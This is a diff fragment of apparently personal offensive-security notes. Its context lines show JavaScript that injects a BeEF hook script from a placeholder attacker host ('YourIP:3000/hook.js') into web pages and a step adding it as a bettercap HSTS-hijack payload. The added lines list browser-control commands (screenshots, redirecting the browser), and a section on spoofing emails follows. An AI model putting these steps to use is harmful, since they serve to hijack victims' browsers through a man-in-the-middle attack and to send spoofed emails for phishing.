@@ -55,7 +55,9 @@ imported.src = 'http://YourIP:3000/hook.js';
 document.head.appendChild(imported);
 ```
 Add to hstshijack.cap in payloads ,*:path/beef.js
-
+- Commands
+	- Spyder Eye (Take screnshot)
+	- Redirect Browser
 ## Fake Emails
 1. Use some email spoof service but they end up in spam
 	- Google spoof email
